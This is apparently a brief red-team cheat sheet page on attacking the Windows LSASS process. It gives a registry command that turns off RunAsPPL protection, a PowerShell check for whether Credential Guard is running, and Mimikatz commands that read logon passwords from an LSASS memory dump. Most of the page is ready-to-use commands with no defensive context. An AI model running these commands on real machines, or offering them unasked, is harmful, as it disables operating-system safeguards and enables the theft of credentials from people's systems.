---
title: LSASS
category: windows
weight: -1
---

## LSASS Protection

### RunAsPPL

- **Registry Path:**  
`RunAsPPL:00000008` -> LSASS process is protected.
    ```
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 
    ```
- **Bupassing RunAsPPL Protection**
1. Disable RunAsPPL protection by modifying the registry value.
    ```
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
    ```
2. Restart the system or the LSASS process for changes to take effect.

---

### Credential Guard
```powershell
if ((Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning -contains 1) {"Credential Guard running"}else {"Credential Guard is not running"}
```

---

## LSASS Dump

### Mimikatz
```
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```


